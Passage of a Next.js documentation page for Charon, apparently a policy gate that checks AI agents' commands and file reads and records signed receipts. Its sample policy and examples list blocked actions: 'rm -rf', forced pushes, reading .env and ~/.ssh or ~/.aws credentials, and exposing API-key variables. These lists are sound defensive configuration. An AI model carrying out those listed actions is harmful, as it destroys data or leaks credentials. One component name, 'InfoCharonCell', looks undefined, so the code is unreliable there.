"use client";

import { useState, useEffect, useRef, useCallback } from "react";
import Link from "next/link";

// ─── Data ───────────────────────────────────────────────────────────────────

const POLICY_LINES = [
  { text: 'version: 1', note: "Schema version. Currently v1." },
  { text: 'default: pass', note: "Fallback verdict when no rule matches. Options: pass, pause, deny." },
  { text: 'bounds:', note: "High-level boundary rules. Simple string lists for pass/pause/deny." },
  { text: '  pass: []', note: "Explicit pass list (empty = rely on default)." },
  { text: '  pause:', note: "Actions that require human review before launch." },
  { text: '    - git push', note: "" },
  { text: '    - gh release create', note: "" },
  { text: '    - deploy production', note: "" },
  { text: '    - terraform apply', note: "" },
  { text: '    - kubectl apply', note: "" },
  { text: '  deny:', note: "Hard blocks. Never launches. Always recorded." },
  { text: '    - git push --force', note: "" },
  { text: '    - npm publish', note: "" },
  { text: '    - rm -rf', note: "" },
  { text: '    - read:.env', note: "Prefix read: blocks file reads. Prefix write: blocks writes." },
  { text: '    - read:~/.ssh/**', note: "Glob patterns supported for path matching." },
  { text: '  secretAction: deny', note: "Default verdict for any action involving detected secrets." },
  { text: '  rules:', note: "Structured rules with ID, verdict, and match conditions." },
  { text: '    - id: release.npm_publish', note: "Unique rule identifier. Used in receipt ruleId field." },
  { text: '      verdict: DENY', note: "" },
  { text: '      command: npm', note: "Match on the command name." },
  { text: '      argsIncludes:', note: "Match if any arg contains this string." },
  { text: '        - publish', note: "" },
  { text: '    - id: release.git_push', note: "" },
  { text: '      verdict: PAUSE', note: "" },
  { text: '      command: git', note: "" },
  { text: '      argsIncludes:', note: "" },
  { text: '        - push', note: "" },
  { text: 'controls:', note: "Fine-grained access controls. Checked independently of bounds." },
  { text: '  files:', note: "Filesystem access rules." },
  { text: '    read:', note: "Allowed read paths (glob patterns)." },
  { text: '      - .', note: "" },
  { text: '    write:', note: "Allowed write paths." },
  { text: '      - .charon/**', note: "" },
  { text: '    deny:', note: "Always-denied file paths. Overrides read/write allowlists." },
  { text: '      - .env', note: "" },
  { text: '      - .env.*', note: "" },
  { text: '      - ~/.ssh/**', note: "" },
  { text: '      - ~/.aws/**', note: "" },
  { text: '      - ~/.config/gh/**', note: "" },
  { text: '  network:', note: "Network access rules." },
  { text: '    allow:', note: "Allowed domains (exact match or suffix)." },
  { text: '      - github.com', note: "" },
  { text: '      - api.github.com', note: "" },
  { text: '  commands:', note: "Command blocking rules." },
  { text: '    deny:', note: "Exact command strings to block." },
  { text: '      - git push --force', note: "" },
  { text: '      - npm publish', note: "" },
  { text: '      - rm -rf', note: "" },
  { text: '  env:', note: "Environment variable access controls." },
  { text: '    expose: []', note: "Variables to expose (empty = none)." },
  { text: '    deny:', note: "Variables to block. Scrubbed from child process env." },
  { text: '      - GITHUB_TOKEN', note: "" },
  { text: '      - GH_TOKEN', note: "" },
  { text: '      - OPENAI_API_KEY', note: "" },
  { text: '      - AWS_SECRET_ACCESS_KEY', note: "" },
  { text: '  output:', note: "Output inspection rules." },
  { text: '    secretAction: deny', note: "Verdict when output contains secrets." },
  { text: '    store: redacted', note: "How to store output in receipts (redacted = strip secrets)." },
  { text: '    maxBytes: 4000', note: "Max output bytes to inspect." },
  { text: 'inspection:', note: "Inspection layer config." },
  { text: '  mode: enforce', note: "enforce = block on high findings. review = pause. observe = log only." },
];

const SIDEBAR = [
  {
    id: "getting-started",
    label: "Getting Started",
    children: [
      { id: "install", label: "Installation" },
      { id: "quick-start", label: "Quick Start" },
      { id: "how-it-works", label: "How It Works" },
    ],
  },
  {
    id: "policy",
    label: "Policy",
    children: [
      { id: "policy-structure", label: "charon.yml" },
      { id: "policy-bounds", label: "Bounds" },
      { id: "policy-rules", label: "Structured Rules" },
      { id: "policy-controls", label: "Controls" },
      { id: "policy-inspection", label: "Inspection" },
    ],
  },
  {
    id: "cli",
    label: "CLI Reference",
    children: [
      { id: "cli-setup", label: "Setup" },
      { id: "cli-gate", label: "Gate" },
      { id: "cli-queue", label: "Queue" },
      { id: "cli-receipts", label: "Receipts" },
      { id: "cli-verify", label: "Verify" },
      { id: "cli-policy", label: "Policy" },
      { id: "cli-identity", label: "Identity" },
      { id: "cli-mcp", label: "MCP" },
      { id: "cli-enforce", label: "Enforce" },
      { id: "cli-exit-codes", label: "Exit Codes" },
    ],
  },
  {
    id: "inspection",
    label: "Inspection",
    children: [
      { id: "inspection-engine", label: "Engine" },
      { id: "inspection-detectors", label: "Detectors" },
      { id: "inspection-session", label: "Session Memory" },
    ],
  },
  {
    id: "receipts",
    label: "Receipts",
    children: [
      { id: "receipts-format", label: "v2 Format" },
      { id: "receipts-signing", label: "Signing" },
      { id: "receipts-redaction", label: "Redaction" },
    ],
  },
  {
    id: "mcp",
    label: "MCP Integration",
    children: [
      { id: "mcp-proxy", label: "Proxy Mode" },
      { id: "mcp-server", label: "Server Mode" },
      { id: "mcp-guard", label: "Guard Mode" },
    ],
  },
  {
    id: "architecture",
    label: "Architecture",
    children: [
      { id: "arch-action", label: "Action Layer" },
      { id: "arch-roles", label: "Role Registry" },
      { id: "arch-coordinator", label: "Coordinator" },
      { id: "arch-audit", label: "Audit Log" },
    ],
  },
];

const FLAT_SECTIONS = SIDEBAR.flatMap((s) => s.children);

// ─── Page ───────────────────────────────────────────────────────────────────

export default function DocsPage() {
  const [activeSection, setActiveSection] = useState("install");
  const [highlightLine, setHighlightLine] = useState<number | null>(null);
  const [expandedGroups, setExpandedGroups] = useState<string[]>(
    SIDEBAR.map((s) => s.id)
  );
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const sectionRefs = useRef<Record<string, HTMLElement | null>>({});

  useEffect(() => {
    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          if (entry.isIntersecting) setActiveSection(entry.target.id);
        });
      },
      { rootMargin: "-20% 0px -60% 0px" }
    );
    Object.values(sectionRefs.current).forEach((el) => {
      if (el) observer.observe(el);
    });
    return () => observer.disconnect();
  }, []);

  const scrollTo = useCallback((id: string) => {
    setMobileMenuOpen(false);
    sectionRefs.current[id]?.scrollIntoView({
      behavior: "smooth",
      block: "start",
    });
  }, []);

  const toggleGroup = (id: string) => {
    setExpandedGroups((prev) =>
      prev.includes(id) ? prev.filter((g) => g !== id) : [...prev, id]
    );
  };

  const ref = (id: string) => (el: HTMLElement | null) => {
    sectionRefs.current[id] = el;
  };

  return (
    <div
      style={{
        minHeight: "100vh",
        background: "#0f0d0d",
        color: "#f0ece4",
        fontFamily: "var(--font-mono)",
      }}
    >
      {/* Nav */}
      <nav
        className="charon-nav"
        style={{
          position: "fixed",
          top: 0,
          left: 0,
          right: 0,
          zIndex: 100,
          borderBottom: "1px solid #1e1a1a",
          background: "rgba(12,10,10,0.92)",
          backdropFilter: "blur(8px)",
        }}
      >
        <div
          style={{
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
            padding: "14px 40px",
            fontSize: "12px",
          }}
        >
          <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
            <button
              className="charon-mobile-menu-btn"
              onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
              style={{
                display: "none",
                padding: "4px 8px",
                color: "#8a8282",
                fontSize: "16px",
              }}
            >
              {mobileMenuOpen ? "×" : "≡"}
            </button>
            <Link
              href="/"
              style={{
                display: "flex",
                alignItems: "center",
                gap: "10px",
                color: "#f0ece4",
                textDecoration: "none",
              }}
            >
              <div
                style={{
                  width: "12px",
                  height: "12px",
                  background: "#e8a040",
                  boxShadow: "0 0 8px rgba(232,160,64,0.4)",
                }}
              />
              <span style={{ fontWeight: 700, letterSpacing: "0.05em" }}>
                CHARON
              </span>
            </Link>
            <span style={{ color: "#5a5454" }}>/</span>
            <span style={{ color: "#e8a040" }}>docs</span>
          </div>
          <div
            style={{
              display: "flex",
              alignItems: "center",
              gap: "24px",
              color: "#8a8282",
            }}
          >
            <a
              href="https://github.com/CharonAI-code/charon"
              style={{ color: "#8a8282", textDecoration: "none" }}
            >
              gh
            </a>
            <a
              href="https://x.com/Charon_AI"
              style={{ color: "#8a8282", textDecoration: "none" }}
            >
              x
            </a>
          </div>
        </div>
      </nav>

      <div style={{ display: "flex", paddingTop: "49px" }}>
        {/* Sidebar */}
        <aside
          className={`charon-docs-sidebar ${mobileMenuOpen ? "open" : ""}`}
          style={{
            position: "fixed",
            top: "49px",
            left: 0,
            bottom: 0,
            width: "220px",
            borderRight: "1px solid #1e1a1a",
            padding: "24px 0",
            overflowY: "auto",
            background: "#0f0d0d",
            zIndex: 90,
          }}
        >
          <div
            style={{
              padding: "0 20px",
              marginBottom: "24px",
            }}
          >
            <div
              style={{
                fontSize: "10px",
                textTransform: "uppercase",
                letterSpacing: "0.2em",
                color: "#5a5454",
                marginBottom: "8px",
              }}
            >
              the ledger
            </div>
          </div>

          {SIDEBAR.map((group) => {
            const isExpanded = expandedGroups.includes(group.id);
            return (
              <div key={group.id}>
                <button
                  onClick={() => toggleGroup(group.id)}
                  style={{
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "space-between",
                    width: "100%",
                    padding: "6px 20px",
                    fontSize: "10px",
                    fontWeight: 700,
                    textTransform: "uppercase",
                    letterSpacing: "0.12em",
                    color: "#8a8282",
                    background: "none",
                    border: "none",
                    cursor: "pointer",
                  }}
                >
                  {group.label}
                  <span style={{ fontSize: "8px", color: "#5a5454" }}>
                    {isExpanded ? "−" : "+"}
                  </span>
                </button>
                {isExpanded &&
                  group.children.map((child) => (
                    <button
                      key={child.id}
                      onClick={() => scrollTo(child.id)}
                      style={{
                        display: "block",
                        width: "100%",
                        textAlign: "left",
                        padding: "5px 20px 5px 32px",
                        fontSize: "11px",
                        borderLeft:
                          activeSection === child.id
                            ? "2px solid #e8a040"
                            : "2px solid transparent",
                        color:
                          activeSection === child.id ? "#f0ece4" : "#5a5454",
                        background:
                          activeSection === child.id
                            ? "rgba(232,160,64,0.06)"
                            : "transparent",
                        transition: "all 150ms ease",
                      }}
                    >
                      {child.label}
                    </button>
                  ))}
              </div>
            );
          })}

          <div
            style={{
              padding: "24px 20px",
              borderTop: "1px solid #1e1a1a",
              marginTop: "24px",
            }}
          >
            <Link
              href="/"
              style={{
                display: "block",
                fontSize: "11px",
                color: "#5a5454",
                textDecoration: "none",
              }}
            >
              ← back to site
            </Link>
          </div>
        </aside>

        {/* Main */}
        <main
          className="charon-docs-main"
          style={{
            marginLeft: "220px",
            flex: 1,
            maxWidth: "820px",
            padding: "40px 48px 120px",
          }}
        >
          {/* ── GETTING STARTED ──────────────────────────────── */}

          <section id="install" ref={ref("install")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="01" title="Installation" />
            <p style={descStyle}>
              Three commands. Local identity. Policy gate. Receipts.
            </p>
            <CommandBlock
              label="setup"
              command="npx github:CharonAI-code/charon setup"
              output="$ created charon.yml\n$ generated ed25519 identity\n$ installed charon command"
            />
            <div style={{ marginTop: "20px" }}>
              <h4 style={subheadStyle}>What setup creates</h4>
              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "1px", background: "#1e1a1a" }}>
                <InfoCell title="charon.yml" desc="Policy file with default rules" />
                <InfoCell title=".charon/identity.json" desc="Ed25519 public key + metadata" />
                <InfoCell title=".charon/identity.key" desc="Private key (mode 0600)" />
                <InfoCell title=".charon/receipts/" desc="Receipt storage directory" />
                <InfoCell title=".charon/queue/" desc="Paused action queue" />
                <InfoCell title="charon binary" desc="Global CLI command (via npx)" />
              </div>
            </div>
          </section>

          <section id="quick-start" ref={ref("quick-start")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="02" title="Quick Start" />
            <p style={descStyle}>
              Gate any command through policy before it runs.
            </p>
            <CommandBlock
              label="pass"
              command="charon gate -- npm test"
              output="$ PASS  default.pass  npm test"
              verdict="PASS"
            />
            <CommandBlock
              label="deny"
              command="charon gate -- cat .env"
              output="$ DENY  file.sensitive_path  .env\n  receipt: .charon/receipts/req_05.json"
              verdict="DENY"
            />
            <CommandBlock
              label="pause"
              command="charon gate -- git push origin main"
              output="$ PAUSE  release.git_push  git push\n  queued: q_abc123"
              verdict="PAUSE"
            />
            <CommandBlock
              label="dry run"
              command="charon gate --dry -- npm publish"
              output="$ DENY  release.npm_publish  npm publish\n  (not executed --dry)"
              verdict="DENY"
            />
          </section>

          <section id="how-it-works" ref={ref("how-it-works")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="03" title="How It Works" />
            <p style={descStyle}>
              Every agent action passes through Charon before anything launches.
              The full event flow is: typed_action → canonical → evaluate →
              inspect → decide → record.
            </p>

            <div
              style={{
                border: "1px solid #1e1a1a",
                padding: "32px",
                marginBottom: "24px",
              }}
            >
              <FlowDiagram />
            </div>

            <h4 style={subheadStyle}>Detailed flow</h4>
            <div
              style={{
                display: "grid",
                gridTemplateColumns: "1fr 1fr",
                gap: "1px",
                background: "#1e1a1a",
                marginBottom: "24px",
              }}
            >
              <FlowStep
                num="1"
                title="RAW TOOL CALL"
                desc="Agent types a command, file read, network call, or MCP tool. Passed as RawToolCall with toolName, args, cwd."
              />
              <FlowStep
                num="2"
                title="ACTION REQUEST"
                desc="createActionRequest() normalizes the input. Infers resource roles from args (paths, URLs, secrets, commands)."
              />
              <FlowStep
                num="3"
                title="RESOURCE CANONICAL"
                desc="Each resource is canonicalized: paths resolved to realpath, URLs normalized, domains extracted, git remotes parsed."
              />
              <FlowStep
                num="4"
                title="POLICY EVALUATE"
                desc="evaluateAction() iterates rules. First match wins. If no match, default verdict applies."
              />
              <FlowStep
                num="5"
                title="INSPECTION"
                desc="inspectInput() runs 6 detector categories against normalized text. Produces findings with severity."
              />
              <FlowStep
                num="6"
                title="DECISION MERGE"
                desc="applyInspectionToDecision() can only escalate (never downgrade). High findings can override PASS to DENY."
              />
              <FlowStep
                num="7"
                title="VERDICT"
                desc="PASS launches. PAUSE enqueues for review. DENY blocks and records."
              />
              <FlowStep
                num="8"
                title="RECEIPT"
                desc="createTrustedReceipt() builds a signed, hashed receipt. Secrets redacted. Stored in .charon/receipts/."
              />
            </div>
          </section>

          {/* ── POLICY ────────────────────────────────────────── */}

          <section id="policy-structure" ref={ref("policy-structure")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="04" title="charon.yml" />
            <p style={descStyle}>
              The policy file defines all enforcement rules. Loaded from the
              project root. SHA-256 hashed for receipt binding.
            </p>

            <div
              className="charon-docs-grid"
              style={{
                display: "grid",
                gridTemplateColumns: "1fr 280px",
                border: "1px solid #1e1a1a",
              }}
            >
              <div
                style={{
                  borderRight: "1px solid #1e1a1a",
                  padding: "16px 0",
                }}
              >
                <div style={codeHeaderStyle}>charon.yml</div>
                {POLICY_LINES.map((line, i) => {
                  const hasNote = line.note !== "";
                  return (
                    <div
                      key={i}
                      onMouseEnter={() => setHighlightLine(i)}
                      onMouseLeave={() => setHighlightLine(null)}
                      style={{
                        display: "flex",
                        padding: "1px 16px",
                        fontSize: "11px",
                        lineHeight: 1.7,
                        background:
                          highlightLine === i
                            ? "rgba(232,160,64,0.08)"
                            : "transparent",
                        borderLeft:
                          highlightLine === i
                            ? "2px solid #e8a040"
                            : "2px solid transparent",
                        cursor: hasNote ? "help" : "default",
                      }}
                    >
                      <span
                        style={{
                          color: "#5a5454",
                          width: "32px",
                          textAlign: "right",
                          marginRight: "16px",
                          userSelect: "none",
                          fontVariantNumeric: "tabular-nums",
                        }}
                      >
                        {i + 1}
                      </span>
                      <span
                        style={{
                          color: "#8a8282",
                          whiteSpace: "pre",
                        }}
                      >
                        {line.text}
                      </span>
                    </div>
                  );
                })}
              </div>

              <div
                style={{
                  padding: "16px",
                  display: "flex",
                  flexDirection: "column",
                  gap: "16px",
                }}
              >
                <div>
                  <div style={sidebarLabelStyle}>
                    {highlightLine !== null
                      ? `line ${highlightLine + 1}`
                      : "hover a line"}
                  </div>
                  {highlightLine !== null &&
                  POLICY_LINES[highlightLine].note ? (
                    <div
                      style={{
                        fontSize: "12px",
                        color: "#8a8282",
                        lineHeight: 1.6,
                      }}
                    >
                      {POLICY_LINES[highlightLine].note}
                    </div>
                  ) : (
                    <div
                      style={{
                        fontSize: "12px",
                        color: "#5a5454",
                        lineHeight: 1.6,
                      }}
                    >
                      Hover over any line to see what it does.
                    </div>
                  )}
                </div>

                <div style={sidebarDivider}>
                  <div style={sidebarLabelStyle}>verdict colors</div>
                  <div
                    style={{
                      display: "flex",
                      flexDirection: "column",
                      gap: "6px",
                      fontSize: "11px",
                    }}
                  >
                    <span>
                      <span style={{ color: "#4a8a5c" }}>PASS</span>{" "}
                      <span style={{ color: "#5a5454" }}>→ allowed, launched</span>
                    </span>
                    <span>
                      <span style={{ color: "#c49a74" }}>PAUSE</span>{" "}
                      <span style={{ color: "#5a5454" }}>→ review required</span>
                    </span>
                    <span>
                      <span style={{ color: "#a05040" }}>DENY</span>{" "}
                      <span style={{ color: "#5a5454" }}>→ blocked, recorded</span>
                    </span>
                  </div>
                </div>

                <div style={sidebarDivider}>
                  <div style={sidebarLabelStyle}>precedence</div>
                  <div
                    style={{
                      fontSize: "11px",
                      color: "#5a5454",
                      lineHeight: 1.6,
                    }}
                  >
                    Rules evaluated in order. First match wins. Inspection can
                    only escalate (PASS→PAUSE→DENY), never downgrade.
                  </div>
                </div>
              </div>
            </div>
          </section>

          <section id="policy-bounds" ref={ref("policy-bounds")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="05" title="Bounds" />
            <p style={descStyle}>
              High-level boundary rules. Simple string lists for pass/pause/deny.
              The bounds section is checked first, before structured rules.
            </p>

            <h4 style={subheadStyle}>Match syntax</h4>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: "1px", background: "#1e1a1a" }}>
              <InfoCell title="git push" desc="Exact command string match" />
              <InfoCell title="read:.env" desc="Prefix match. read: = file read. write: = file write." />
              <InfoCell title="~/.ssh/**" desc="Glob pattern. ** matches any path depth." />
            </div>

            <h4 style={{ ...subheadStyle, marginTop: "28px" }}>secretAction</h4>
            <p style={descStyle}>
              Default verdict for any action where Charon detects a secret-like
              value (API keys, tokens, private keys). Overrides bounds default.
            </p>

            <div style={{ ...codeBlock, marginTop: "16px" }}>
              <span style={{ color: "#5a5454" }}>secretAction:</span>{" "}
              <span style={{ color: "#a05040" }}>deny</span>
            </div>
          </section>

          <section id="policy-rules" ref={ref("policy-rules")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="06" title="Structured Rules" />
            <p style={descStyle}>
              Rules under bounds.rules provide fine-grained matching with unique
              IDs. Each rule produces a traceable ruleId in receipts.
            </p>

            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "1px", background: "#1e1a1a", marginBottom: "24px" }}>
              <InfoCell title="id" desc="Unique identifier. Appears in receipt ruleId field." />
              <InfoCell title="verdict" desc="PASS, PAUSE, or DENY. Required." />
              <InfoCell title="role" desc="Optional. Restrict match to a resource role (e.g. shell-command)." />
              <InfoCell title="equals" desc="Exact match on resource value." />
              <InfoCell title="includes" desc="Substring match on resource value." />
              <InfoCharonCell title="prefix" desc="Prefix match on resource value." />
            </div>

            <h4 style={subheadStyle}>Example</h4>
            <div style={codeBlock}>
              <pre style={{ margin: 0, fontSize: "11px", lineHeight: 1.7, color: "#8a8282" }}>{`rules:
  - id: release.npm_publish
    verdict: DENY
    command: npm
    argsIncludes:
      - publish

  - id: release.git_push
    verdict: PAUSE
    command: git
    argsIncludes:
      - push`}</pre>
            </div>
          </section>

          <section id="policy-controls" ref={ref("policy-controls")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="07" title="Controls" />
            <p style={descStyle}>
              Fine-grained access controls checked independently of bounds.
              Controls enforce filesystem, network, command, environment, and
              output restrictions.
            </p>

            <h4 style={subheadStyle}>files</h4>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: "1px", background: "#1e1a1a", marginBottom: "24px" }}>
              <InfoCell title="read" desc="Allowed read paths. Glob patterns supported." />
              <InfoCell title="write" desc="Allowed write paths. Only these can be written." />
              <InfoCell title="deny" desc="Always blocked. Overrides read/write." />
            </div>

            <h4 style={subheadStyle}>network</h4>
            <div style={{ ...codeBlock, marginBottom: "24px" }}>
              <pre style={{ margin: 0, fontSize: "11px", lineHeight: 1.7, color: "#8a8282" }}>{`network:
  allow:
    - github.com
    - api.github.com`}</pre>
            </div>

            <h4 style={subheadStyle}>commands</h4>
            <div style={{ ...codeBlock, marginBottom: "24px" }}>
              <pre style={{ margin: 0, fontSize: "11px", lineHeight: 1.7, color: "#8a8282" }}>{`commands:
  deny:
    - git push --force
    - npm publish
    - rm -rf`}</pre>
            </div>

            <h4 style={subheadStyle}>env</h4>
            <div style={{ ...codeBlock, marginBottom: "24px" }}>
              <pre style={{ margin: 0, fontSize: "11px", lineHeight: 1.7, color: "#8a8282" }}>{`env:
  expose: []
  deny:
    - GITHUB_TOKEN
    - GH_TOKEN
    - OPENAI_API_KEY
    - AWS_SECRET_ACCESS_KEY`}</pre>
            </div>
            <p style={{ ...descStyle, marginTop: "-12px" }}>
              Denied env vars are scrubbed from the child process environment
              when gate launches a command.
            </p>

            <h4 style={subheadStyle}>output</h4>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: "1px", background: "#1e1a1a" }}>
              <InfoCell title="secretAction" desc="Verdict when output contains secrets (default: deny)." />
              <InfoCell title="store" desc="How to store in receipts (redacted strips secrets)." />
              <InfoCell title="maxBytes" desc="Max output bytes to inspect (default: 4000)." />
            </div>
          </section>

          <section id="policy-inspection" ref={ref("policy-inspection")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="08" title="Inspection Config" />
            <p style={descStyle}>
              Controls how the inspection layer handles findings.
            </p>

            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: "1px", background: "#1e1a1a" }}>
              <ModeCell mode="enforce" desc="High findings → DENY. Blocks execution." />
              <ModeCell mode="review" desc="High findings → PAUSE. Queues for human review." />
              <ModeCell mode="observe" desc="High findings → PASS. Logs only, never blocks." />
            </div>
          </section>

          {/* ── CLI REFERENCE ──────────────────────────────────── */}

          <section id="cli-setup" ref={ref("cli-setup")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="09" title="Setup Commands" />

            <div style={{ display: "flex", flexDirection: "column", gap: "1px", background: "#1e1a1a" }}>
              <CommandRef name="charon init" desc="Create charon.yml with default policy. Use --force to overwrite." />
              <CommandRef name="charon setup" desc="Init + identity + binary. Full first-time setup." />
              <CommandRef name="charon doctor" desc="Check Node.js, charon.yml, identity. Reports OK/NO/WARN." />
              <CommandRef name="charon selftest" desc="Run automated checks: pass, deny file, deny network, pause, verify." />
              <CommandRef name="charon status" desc="Dashboard: receipt count, queue count, last verdict, policy hash." />
              <CommandRef name="charon compile" desc="Normalize policy and output hash. Generates .charon/generated/charon-policy.yml." />
            </div>
          </section>

          <section id="cli-gate" ref={ref("cli-gate")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="10" title="Gate" />
            <p style={descStyle}>
              The core enforcement command. Runs a command through policy before
              execution. Exit codes: 0 = PASS, 125 = PAUSE, 126 = DENY.
            </p>

            <div style={{ display: "flex", flexDirection: "column", gap: "1px", background: "#1e1a1a" }}>
              <CommandRef name="charon gate -- <cmd>" desc="Gate a command. Runs it if PASS, blocks if DENY, queues if PAUSE." />
              <CommandRef name="charon gate --dry -- <cmd>" desc="Check-only mode. Returns verdict without executing." />
              <CommandRef name="charon gate --json -- <cmd>" desc="Output decision as JSON (verdict, reason, ruleId, resources)." />
              <CommandRef name="charon gate --verbose -- <cmd>" desc="Print full decision trace including inspection findings." />
              <CommandRef name="charon gate --no-prompt -- <cmd>" desc="Non-interactive mode. PAUSE exits immediately (no review prompt)." />
              <CommandRef name="charon gate --policy <path> -- <cmd>" desc="Use a custom policy file instead of charon.yml." />
              <CommandRef name="charon gate --identity <path> -- <cmd>" desc="Use a custom identity key for receipt signing." />
            </div>

            <h4 style={{ ...subheadStyle, marginTop: "28px" }}>Output inspection</h4>
            <p style={descStyle}>
              After a PASS command executes, its stdout/stderr is scanned for
              secrets. If secrets are found and output.secretAction is deny, the
              receipt is marked DENY and exit code is overridden to 126.
            </p>
          </section>

          <section id="cli-queue" ref={ref("cli-queue")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="11" title="Queue" />
            <p style={descStyle}>
              PAUSE actions are enqueued for human review. Queue items are stored
              in .charon/queue/ as JSON files.
            </p>

            <div style={{ display: "flex", flexDirection: "column", gap: "1px", background: "#1e1a1a" }}>
              <CommandRef name="charon queue" desc="List all pending paused actions." />
              <CommandRef name="charon approve <id>" desc="Approve a paused action. Re-evaluates against current policy. Runs if PASS." />
              <CommandRef name="charon approve <id> --yes" desc="Force approve even if policy changed since queuing." />
              <CommandRef name="charon reject <id>" desc="Reject a paused action. Writes a DENY receipt." />
            </div>

            <h4 style={{ ...subheadStyle, marginTop: "28px" }}>Safety checks</h4>
            <p style={descStyle}>
              On approve, Charon re-evaluates the action against current policy.
              If the policy changed or the action is now DENY, approval is
              blocked (override with --yes for non-blocking changes).
            </p>
          </section>

          <section id="cli-receipts" ref={ref("cli-receipts")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="12" title="Receipts" />
            <p style={descStyle}>
              Query and inspect receipts. All receipts stored locally in
              .charon/receipts/.
            </p>

            <div style={{ display: "flex", flexDirection: "column", gap: "1px", background: "#1e1a1a" }}>
              <CommandRef name="charon receipts list" desc="List all receipts (newest first). Shows id, verdict, rule, command." />
              <CommandRef name="charon receipts latest" desc="Show the most recent receipt with full details." />
              <CommandRef name="charon receipts inspect <id>" desc="Show full receipt JSON for a specific ID." />
              <CommandRef name="charon receipts search <query>" desc="Search receipts by text (command, rule, reason)." />
              <CommandRef name="charon receipts explain <id>" desc="Human-readable explanation of a receipt decision." />
              <CommandRef name="charon receipts --json" desc="Output as JSON array for machine consumption." />
            </div>
          </section>

          <section id="cli-verify" ref={ref("cli-verify")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="13" title="Verify" />
            <p style={descStyle}>
              Verify receipt integrity and signature.
            </p>

            <div style={{ display: "flex", flexDirection: "column", gap: "1px", background: "#1e1a1a" }}>
              <CommandRef name="charon verify <id>" desc="Verify a receipt: hash integrity + Ed25519 signature check." />
              <CommandRef name="charon verify latest" desc="Verify the most recent receipt." />
              <CommandRef name="charon trace <id>" desc="Full trace: action, decision, receipt, execution, audit entry." />
            </div>

            <h4 style={{ ...subheadStyle, marginTop: "28px" }}>What verify checks</h4>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "1px", background: "#1e1a1a" }}>
              <InfoCell title="Hash integrity" desc="SHA-256 of unsigned receipt matches receiptHash field." />
              <InfoCell title="Signature" desc="Ed25519 signature over receiptHash verifies against public key." />
              <InfoCell title="Schema" desc="Receipt schema is charon.trustedReceipt.v2." />
              <InfoCell title="Redaction" desc="Secrets are [REDACTED] in stored receipt. Original not recoverable." />
            </div>
          </section>

          <section id="cli-policy" ref={ref("cli-policy")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="14" title="Policy Commands" />

            <div style={{ display: "flex", flexDirection: "column", gap: "1px", background: "#1e1a1a" }}>
              <CommandRef name="charon policy" desc="Print the active charon.yml policy." />
              <CommandRef name="charon policy synth" desc="Generate a policy proposal from local project scripts and recent receipts." />
              <CommandRef name="charon policy review [id]" desc="Review a policy proposal. Shows diff from current policy." />
              <CommandRef name="charon policy apply <id>" desc="Apply an approved policy proposal. Replaces charon.yml." />
            </div>
          </section>

          <section id="cli-identity" ref={ref("cli-identity")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="15" title="Identity" />

            <div style={{ display: "flex", flexDirection: "column", gap: "1px", background: "#1e1a1a" }}>
              <CommandRef name="charon keygen" desc="Generate Ed25519 keypair. Creates .charon/identity.key + identity.json." />
              <CommandRef name="charon keygen --force" desc="Replace existing identity. Invalidates previous receipt signatures." />
              <CommandRef name="charon identity" desc="Show public key, key type, and key path." />
            </div>

            <h4 style={{ ...subheadStyle, marginTop: "28px" }}>Identity file format</h4>
            <div style={codeBlock}>
              <pre style={{ margin: 0, fontSize: "11px", lineHeight: 1.7, color: "#8a8282" }}>{`{
  "schema": "charon.identity.v1",
  "type": "ed25519",
  "publicKey": "-----BEGIN PUBLIC KEY-----\\n...\\n-----END PUBLIC KEY-----",
  "privateKeyPath": ".charon/identity.key",
  "createdAt": "2025-01-15T14:32:12.734Z"
}`}</pre>
            </div>
          </section>

          <section id="cli-mcp" ref={ref("cli-mcp")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="16" title="MCP Commands" />
            <p style={descStyle}>
              Model Context Protocol integration. Wraps MCP servers through
              Charon for enforcement.
            </p>

            <div style={{ display: "flex", flexDirection: "column", gap: "1px", background: "#1e1a1a" }}>
              <CommandRef name="charon mcp server" desc="Start a Charon MCP server. Proxies tool calls through policy." />
              <CommandRef name="charon mcp proxy -- <cmd>" desc="Wrap any MCP server command through Charon proxy." />
              <CommandRef name="charon mcp install codex" desc="Install Charon as MCP server in Codex config.toml." />
              <CommandRef name="charon mcp guard codex" desc="Rewrite all Codex MCP servers to go through Charon proxy." />
              <CommandRef name="charon mcp status codex" desc="Show which MCP servers are guarded vs open." />
              <CommandRef name="charon mcp unguard codex" desc="Restore original MCP server commands. Remove Charon proxy." />
              <CommandRef name="charon mcp wrap <name> -- <cmd>" desc="Generate wrapped MCP config JSON for any server." />
              <CommandRef name="charon mcp config <name> -- <cmd>" desc="Output MCP server config with Charon proxy wrapper." />
            </div>
          </section>

          <section id="cli-enforce" ref={ref("cli-enforce")} style={{ marginBottom: "80px" }}>
            <SectionLabel number="17" title="Enforce" />
            <p style={descStyle}>
              One-command setup for Codex enforcement. Disables native shell and
              routes all tool calls through Charon MCP.
            </p>

